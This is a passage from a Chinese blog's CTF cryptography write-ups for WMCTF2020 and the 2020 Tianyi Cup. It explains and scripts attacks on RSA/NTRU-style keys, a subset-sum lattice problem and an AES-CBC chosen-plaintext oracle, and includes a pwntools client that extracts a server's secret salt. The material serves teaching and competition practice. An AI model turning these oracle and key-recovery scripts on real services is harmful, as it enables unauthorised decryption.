BITS)</span><br><span class="line">    q = getPrime(BITS &lt;&lt; <span class="number">1</span> | BITS)</span><br><span class="line">    f = d</span><br><span class="line">    g = getPrime(size(q) - size(f) - <span class="number">1</span>)</span><br><span class="line">    f_inv_q = inverse(f, q)</span><br><span class="line">    h = f_inv_q * g % q</span><br><span class="line">    r = getPrime(BITS)</span><br><span class="line">    c1 = (r * h + cake) % q</span><br><span class="line">    c2 = pow(cake, <span class="number">0x10001</span>, N)</span><br><span class="line">    print(cake)</span><br><span class="line">    <span class="keyword">return</span> q, h, c1, N, c2</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[103]:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_cake</span><span class="params">()</span>:</span></span><br><span class="line">    p, q = getPrime(BITS), getPrime(BITS)</span><br><span class="line">    N = p * q</span><br><span class="line">    ph = (p - <span class="number">1</span>) * (q + <span class="number">1</span>)</span><br><span class="line">    d = inverse(e, ph)</span><br><span class="line">    </span><br><span class="line">    cake = getPrime(BITS &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    q = getPrime(BITS &lt;&lt; <span class="number">1</span> | BITS)</span><br><span class="line">    f = d</span><br><span class="line">    g = getPrime(size(q) - size(f) - <span class="number">1</span>)</span><br><span class="line">    f_inv_q = inverse(f, q)</span><br><span class="line">    h = f_inv_q * g % q</span><br><span class="line">    r = getPrime(BITS)</span><br><span class="line">    c1 = (r * h + cake) % q</span><br><span class="line">    c2 = pow(cake, d, N)</span><br><span class="line">    <span class="keyword">return</span> q, h, c1, N, c2</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[104]:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rational_to_quotients</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    a = x // y</span><br><span class="line">    quotients = [a]</span><br><span class="line">    <span class="keyword">while</span> a * y != x:</span><br><span class="line">        x, y = y, x - a * y</span><br><span class="line">        a = x // y</span><br><span class="line">        quotients.append(a)</span><br><span class="line">    <span class="keyword">return</span> quotients</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convergents_from_quotients</span><span class="params">(quotients)</span>:</span></span><br><span class="line">    convergents = [(quotients[<span class="number">0</span>], <span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, len(quotients) + <span class="number">1</span>):</span><br><span class="line">        quotients_partion = quotients[<span class="number">0</span>:i]</span><br><span class="line">        denom = quotients_partion[<span class="number">-1</span>]  <span class="comment"># 分母</span></span><br><span class="line">        num = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">-2</span>, -len(quotients_partion), <span class="number">-1</span>):</span><br><span class="line">            num, denom = denom, quotients_partion[_] * denom + num</span><br><span class="line">        num += denom * quotients_partion[<span class="number">0</span>]</span><br><span class="line">        convergents.append((num, denom))</span><br><span class="line">    <span class="keyword">return</span> convergents</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[105]:</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[106]:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_d</span><span class="params">()</span>:</span></span><br><span class="line">    dAndN = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">15</span>)):</span><br><span class="line">        q, h, c1, N, c2 = make_cake()</span><br><span class="line">        quotients = rational_to_quotients(h, q)</span><br><span class="line">        convergents = convergents_from_quotients(quotients)</span><br><span class="line">        <span class="keyword">for</span> (k, f) <span class="keyword">in</span> convergents:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                g = (f * h) % q</span><br><span class="line">                f_inv_g = inverse(f, g)</span><br><span class="line">                cake = (c1 * f % q) * f_inv_g % g</span><br><span class="line">                <span class="keyword">if</span> pow(cake, f, N) == c2:</span><br><span class="line">                    dAndN.append((f, N))</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> dAndN</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[107]:</span></span><br><span class="line"></span><br><span class="line">dAndN = crack_d()</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[108]:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_e</span><span class="params">(dAndN)</span>:</span></span><br><span class="line">    ds = [_[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> dAndN]</span><br><span class="line">    Ns = [_[<span class="number">1</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> dAndN]</span><br><span class="line">    M = isqrt(max(Ns))</span><br><span class="line">    A = Matrix(ZZ, len(dAndN) + <span class="number">1</span>, len(dAndN) + <span class="number">1</span>)</span><br><span class="line">    A[<span class="number">0</span>] = [M] + ds</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(dAndN)):</span><br><span class="line">        A[i + <span class="number">1</span>, i + <span class="number">1</span>] = -Ns[i]</span><br><span class="line">    AL = A.LLL()</span><br><span class="line">    e = AL[<span class="number">0</span>, <span class="number">0</span>] // M</span><br><span class="line">    <span class="keyword">return</span> abs(e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[109]:</span></span><br><span class="line"></span><br><span class="line">guessed_e = crack_e(dAndN)</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[113]:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factor_n</span><span class="params">(e)</span>:</span></span><br><span class="line">    q, h, c1, N, c2 = eat_cake()</span><br><span class="line">    quotients = rational_to_quotients(h, q)</span><br><span class="line">    convergents = convergents_from_quotients(quotients)</span><br><span class="line">    <span class="keyword">for</span> (k, f) <span class="keyword">in</span> convergents:</span><br><span class="line">        p = GCD(int(pow(<span class="number">2</span>, f * e - <span class="number">1</span>, N) - <span class="number">1</span>), N)</span><br><span class="line">        <span class="keyword">if</span> p &gt; <span class="number">1</span> <span class="keyword">and</span> p &lt; N:</span><br><span class="line">            q = N // p</span><br><span class="line">            d = inverse(<span class="number">0x10001</span>, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">            cake = pow(c2, d, N)</span><br><span class="line">            print(cake)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In[114]:</span></span><br><span class="line"></span><br><span class="line">factor_n(guessed_e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Out[114]:</span></span><br><span class="line"></span><br><span class="line"><span class="number">1027157078764690788142214800555547316945408825954295437289921287369230545318955110388392518217927993775664997807441799234649846512106765423582377942936106014367093824346097587115033287595424792363420560894490129540416253724597810397</span></span><br><span class="line"><span class="number">1027157078764690788142214800555547316945408825954295437289921287369230545318955110388392518217927993775664997807441799234649846512106765423582377942936106014367093824346097587115033287595424792363420560894490129540416253724597810397</span></span><br></pre></td></tr></table></figure><h4 id="Others"><a href="#Others" class="headerlink" title="[Others]"></a>[Others]</h4><p>非预期是因为给出size(e)，所以只需eat_cake即可通过cake%g和g恢复出cake- -</p><h3 id="baby-sum-amp-sum"><a href="#baby-sum-amp-sum" class="headerlink" title="baby_sum &amp; sum"></a>baby_sum &amp; sum</h3><h4 id="题解分析-1"><a href="#题解分析-1" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>baby_sum中n=120，k=20 (即120维子集和问题，解向量重量为20)</p><ul><li>BKZ所约化的格基在行序shuffle后得到结果一般不同</li><li>作forced_zero降维，假设降维至105维，则要forced_zero的20个pos均落在解向量为0的pos上，概率为C(100,15)/C(120,15)</li><li>BKZ的block_size取22或以上</li></ul><script type="math/tex; mode=display">\left[\begin{matrix}Na_{1} & 1 & 0 & ... & 0 & N\\Na_{2} & 0 & 1 & ... & 0 & N\\... & ... & ... & ... & ... & ...\\Na_{n} & 0 & 0 & ... & 1 & N\\Nc & 0 & 0 & ... & 0 & Nk\\\end{matrix}\right],N>\sqrt{n}</script><p>btw，(2, 1)那个格子在本题也8太彳亍，且格基行序不shuffle，而是把Nc所在行放至首行成功率也莫名高…玄学（x</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Random.random <span class="keyword">as</span> random</span><br><span class="line"><span class="keyword">import</span> multiprocessing <span class="keyword">as</span> mp</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> partial</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> load</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span><span class="params">(elements, c, k, r, ID=None)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(len(elements) &gt; r)</span><br><span class="line">    n = len(elements) - r <span class="comment"># reduce dim -&gt; n</span></span><br><span class="line">    forced_zero = list(range(len(elements)))</span><br><span class="line">    indexes = set(range(len(elements)))</span><br><span class="line">    coef = ceil(sqrt(n))</span><br><span class="line">    itr = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        t0 = cputime()</span><br><span class="line">        random.shuffle(forced_zero)</span><br><span class="line">        zero = set(forced_zero[:r])</span><br><span class="line">        <span class="comment"># print(zero)</span></span><br><span class="line">        reduced_indexes = [elements[i] <span class="keyword">for</span> i <span class="keyword">in</span> indexes - zero]</span><br><span class="line">        A_list = [[coef * c] + [<span class="number">0</span>] * n + [coef * k]]</span><br><span class="line">        <span class="keyword">for</span> i, ele <span class="keyword">in</span> enumerate(reduced_indexes):</span><br><span class="line">            A_list.append([coef * ele] + [<span class="number">1</span> * (j == i + <span class="number">1</span>) <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, n + <span class="number">1</span>)] + [coef])</span><br><span class="line">        <span class="comment"># random.shuffle(A_list) # row shuffle(extremely useful in most cases)</span></span><br><span class="line">        A = Matrix(ZZ, A_list)</span><br><span class="line">        AL = A.BKZ(block_size=<span class="number">22</span>)</span><br><span class="line">        print(<span class="string">"[&#123;&#125;] &#123;&#125; runs, cost &#123;:.3f&#125; s."</span>.format(ID, itr, cputime(t0)))</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> AL:</span><br><span class="line">            <span class="keyword">if</span> all(line[i] == <span class="number">0</span> <span class="keyword">or</span> line[i] == <span class="number">-1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n + <span class="number">2</span>)) <span class="keyword">or</span> all(line[i] == <span class="number">0</span> <span class="keyword">or</span> line[i] == <span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n + <span class="number">2</span>)):</span><br><span class="line">                <span class="keyword">if</span> <span class="number">-1</span> <span class="keyword">in</span> line:</span><br><span class="line">                    line = -line</span><br><span class="line">                print(<span class="string">"[&#123;&#125;] &#123;&#125; success! &#123;&#125; &#123;&#125;"</span>.format(ID, itr, line[<span class="number">1</span>:<span class="number">-1</span>], zero))</span><br><span class="line">                part_sol = line[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">                sol = <span class="string">''</span></span><br><span class="line">                j = <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(len(elements)):</span><br><span class="line">                    <span class="keyword">if</span> i <span class="keyword">in</span> zero:</span><br><span class="line">                        sol += <span class="string">'0'</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        sol += str(part_sol[j])</span><br><span class="line">                        j += <span class="number">1</span></span><br><span class="line">                print(<span class="string">"You got it ===&gt; &#123;&#125;"</span>.format(sol))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        itr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    CPU_CORE_NUM = <span class="number">8</span> <span class="comment"># 8核</span></span><br><span class="line">    c, elements = load(open(<span class="string">"data"</span>, <span class="string">"r"</span>))</span><br><span class="line">    k = <span class="number">20</span></span><br><span class="line">    r = <span class="number">15</span> <span class="comment"># 15-dim lower</span></span><br><span class="line">    crack_ID = partial(crack, elements, c, k, r) <span class="comment"># 高阶偏函数</span></span><br><span class="line">    <span class="keyword">with</span> mp.Pool(CPU_CORE_NUM) <span class="keyword">as</span> pool:</span><br><span class="line">        status = pool.imap_unordered(crack_ID, range(<span class="number">1</span>, <span class="number">1</span> + CPU_CORE_NUM))</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> status:</span><br><span class="line">            <span class="keyword">if</span> s:</span><br><span class="line">                pool.terminate()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>顺便复习了一次python的多进程- -</p><p>(注：脚本中行序shuffle被注释，因为Nc行放置首行一般出的都很快…不知道why)</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/WriteUp-WMCTF2020-Crypto/Snipaste_2020-08-03_23-20-00.png" alt></p><h4 id="Others-1"><a href="#Others-1" class="headerlink" title="[Others]"></a>[Others]</h4><p>Sum没跑- -祥哥说测题的时候要300+ cpu hours，震撼我妈</p><p><a href="Sum_wp.pdf">Click Here to Download Soreat_u’s Official WriteUp</a></p><h3 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h3><h4 id="题解分析-2"><a href="#题解分析-2" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>AES-CBC的选择明文攻击，即$mt$可控，返回$ct=E_{k}(mt||salt)$的oracle</p><p>该oracle下，如图所示，在任意分组中异或后前15bits可控，即可爆破获得未知LSB</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/WriteUp-WMCTF2020-Crypto/Snipaste_2020-08-05_16-15-01.png" alt></p><p>发送<code>b&quot;\x00&quot;*15</code>至服务器，则明文第一个分组为<code>b&quot;\x00&quot;*15+salt[0]</code>，截取<code>cipher=ct[:16], known_iv=iv, iv=ct[-16:]</code>（Crypto.Cipher.AES的CBC模式iv是会随着加密行为更新的- -||，👴开debug后发现加密相同明文得到不同密文…tcl，所以必需在每次encrypt后更新iv=ct[-16:]）</p><p>再爆破LSB，即发送<code>xor(b&quot;\x00&quot;*15+lsb, known_iv, iv)</code>至服务器(爆破过程记得更新iv)，当ct[:16]=cipher时，lsb正确</p><p>得到salt[0]后，类似发送14bits, 13bits, …至服务器，得到salt[1:16]，但server判断len(mt)≠0，因此在爆破salt[15]时，prefix长度应为16</p><p>下图为爆破salt[16]的示意图</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/WriteUp-WMCTF2020-Crypto/Snipaste_2020-08-05_22-21-36.png" alt></p><p>和爆破salt[0]时一样，发送<code>b&quot;\x00&quot;*15</code>，但此时cipher对应第二个分组，且known_iv为ct[:16]</p><p>利用已知的salt[1:16]即可爆破LSB，获得salt[16]，后续比特操作均类似</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re, string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="comment"># from tqdm import tqdm</span></span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">io = remote(argv[<span class="number">1</span>], argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bytes(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"sha256"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    suffix = re.findall(<span class="string">r"XXXX\+([^\)]+)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    cipher = re.findall(<span class="string">r"== ([^\n]+)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, string.ascii_letters + string.digits, length=<span class="number">4</span>, method=<span class="string">'fixed'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Give me XXXX: "</span>, proof)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_lsb</span><span class="params">(known, cipher, known_iv, iv)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(len(known) == <span class="number">15</span>)</span><br><span class="line">    <span class="keyword">for</span> lsb <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">        mt = known + bytes([lsb])</span><br><span class="line">        new_iv = xor(known_iv, iv)</span><br><span class="line">        mt = hexlify(xor(mt, new_iv))</span><br><span class="line">        io.sendlineafter(<span class="string">"(in hex): "</span>, mt)</span><br><span class="line">        ct = unhexlify(io.recvline().strip())</span><br><span class="line">        iv = ct[<span class="number">-16</span>:]</span><br><span class="line">        <span class="keyword">if</span> ct[:<span class="number">16</span>] == cipher:</span><br><span class="line">            print(hex(lsb)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">"0"</span>), end=<span class="string">""</span>)</span><br><span class="line">            <span class="keyword">return</span> bytes([lsb]), iv</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">"[!] Not Found!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_salt</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"IV"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    iv = unhexlify(re.findall(<span class="string">r"is: ([^\n]+)"</span>, msg)[<span class="number">0</span>])</span><br><span class="line">    known = <span class="string">b"\x00"</span> * <span class="number">15</span></span><br><span class="line">    salt = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">15</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">            prefix = hexlify(<span class="string">b"\x00"</span> * j)</span><br><span class="line">            io.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">            io.sendlineafter(<span class="string">"(in hex): "</span>, prefix)</span><br><span class="line">            resp = unhexlify(io.recvline().strip())</span><br><span class="line">            cipher = resp[i*<span class="number">16</span>:(i+<span class="number">1</span>)*<span class="number">16</span>]</span><br><span class="line">            <span class="keyword">if</span> i &gt; <span class="number">0</span>:</span><br><span class="line">                known_iv = resp[(i<span class="number">-1</span>)*<span class="number">16</span>:i*<span class="number">16</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                known_iv = iv</span><br><span class="line">            iv = resp[<span class="number">-16</span>:]</span><br><span class="line">            lsb, iv = crack_lsb(known, cipher, known_iv, iv)</span><br><span class="line">            known = known[<span class="number">1</span>:] + lsb</span><br><span class="line">            salt += lsb</span><br><span class="line">        prefix = hexlify(<span class="string">b"\x00"</span> * <span class="number">16</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">"(in hex): "</span>, prefix)</span><br><span class="line">        resp = unhexlify(io.recvline().strip())</span><br><span class="line">        cipher = resp[(i+<span class="number">1</span>)*<span class="number">16</span>:(i+<span class="number">2</span>)*<span class="number">16</span>]</span><br><span class="line">        known_iv = resp[i*<span class="number">16</span>:(i+<span class="number">1</span>)*<span class="number">16</span>]</span><br><span class="line">        iv = resp[<span class="number">-16</span>:]</span><br><span class="line">        lsb, iv = crack_lsb(known, cipher, known_iv, iv)</span><br><span class="line">        known = known[<span class="number">1</span>:] + lsb</span><br><span class="line">        salt += lsb</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(in hex): "</span>, hexlify(salt))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    proof_of_work()</span><br><span class="line">    crack_salt()</span><br><span class="line">    print(<span class="string">"\n"</span> + io.recvline().strip().decode())</span><br><span class="line">    io.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="Others-2"><a href="#Others-2" class="headerlink" title="[Others]"></a>[Others]</h4><p>48*(256+1)次encrypt，本地测秒出，挂载云服务器大概给出的alram(1200)也绰绰有余</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/WriteUp-WMCTF2020-Crypto/Snipaste_2020-08-05_22-27-56.png" alt></p><p>i春秋公益赛赵总出了题挺类似的(NewsWebsite)，也是$ct=E_{k}(mt||salt)$的oracle，但是是ECB_MODE，<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuoj.cn</a>上有复现环境，感兴趣可以去van~</p><h3 id="idiot-box"><a href="#idiot-box" class="headerlink" title="idiot box"></a>idiot box</h3><h4 id="题解分析-3"><a href="#题解分析-3" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p><a href="https://0xdktb.top/2020/04/11/Summary-of-Crypto-in-CTF-Block/#%E5%B7%AE%E5%88%86%E5%88%86%E6%9E%90" target="_blank" rel="noopener">Click Here to View the WriteUp</a></p><h4 id="Others-3"><a href="#Others-3" class="headerlink" title="[Others]"></a>[Others]</h4><p>SU用的也是二轮迭代差分特征，但似乎更好些（甚至让我觉得普适性的1-R差分攻击是个憨憨…</p><p>图1是我所用四条差分路径其中的一条（对应的不是WMCTF上发布的版本，是我之前自己测题的第一版，难度会更大些，图懒得改了- -btw祥哥推荐的<a href="https://draw.io/" target="_blank" rel="noopener">draw.io</a>画图真的好用）</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/WriteUp-WMCTF2020-Crypto/idiot_box.png" alt></p><p>而图2是祥哥所用的差分路径（对应的是WMCTF上发布的版本，但是一条就能出最后一轮完整的子密钥）</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/WriteUp-WMCTF2020-Crypto/Screen Shot 2020-08-03 at 5.47.03 AM.png" style="zoom:50%;"></p><p>差异就在于是2-R差分攻击，T_L’已知，但T_R’未知，且在这里T_R’据说可以激活第六轮全部八个S盒，所以能分段8次得到完整子密钥</p><p>而1-R攻击给出的差分路径使得l’和r’均固定（相较于2-R差分攻击具备了去噪能力），但相应的，这条路径的r’也只能激活第六轮的Sbox[1]和Sbox[2]，即只能攻击得到第六轮子密钥的前12bit，剩下比特再通过相同方法得到3条差分路径，直至攻击恢复出完整子密钥</p><p>有亿点点憨啊1-R攻击这么看起来…wtcl</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(中国电信2020天翼杯) - Crypto</title>
      <link href="/2020/07/31/WriteUp-%E4%B8%AD%E5%9B%BD%E7%94%B5%E4%BF%A12020%E5%A4%A9%E7%BF%BC%E6%9D%AF-Crypto/"/>
      <url>/2020/07/31/WriteUp-%E4%B8%AD%E5%9B%BD%E7%94%B5%E4%BF%A12020%E5%A4%A9%E7%BF%BC%E6%9D%AF-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="EasyRSA"><a href="#EasyRSA" class="headerlink" title="EasyRSA"></a>EasyRSA</h3><h4 id="题解分析"><a href="#题解分析" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>Cry签到题，逐字节的RSA，且<code>assert(e &lt; 20000)</code>，爆破即可</p><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">c = [...]</span><br><span class="line">e = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">20000</span>):</span><br><span class="line">    <span class="keyword">if</span> pow(ord(<span class="string">'f'</span>), _, n) == c[<span class="number">0</span>]:</span><br><span class="line">        e = _</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># e = 11299</span></span><br><span class="line">flag_char = [ord(_) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">'0123456789abcdef'</span>]</span><br><span class="line"><span class="keyword">for</span> c_char <span class="keyword">in</span> c[<span class="number">5</span>:<span class="number">-1</span>]:</span><br><span class="line">    <span class="keyword">for</span> m_char <span class="keyword">in</span> flag_char:</span><br><span class="line">        <span class="keyword">if</span> pow(m_char, e, n) == c_char:</span><br><span class="line">            print(chr(m_char), end=<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># caf94ef5f8400ae920c0bd79489f3791</span></span><br></pre></td></tr></table></figure><h3 id="HardRSA"><a href="#HardRSA" class="headerlink" title="HardRSA"></a>HardRSA</h3><h4 id="题解分析-1"><a href="#题解分析-1" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><figure class="highlight python"><table><tr><td 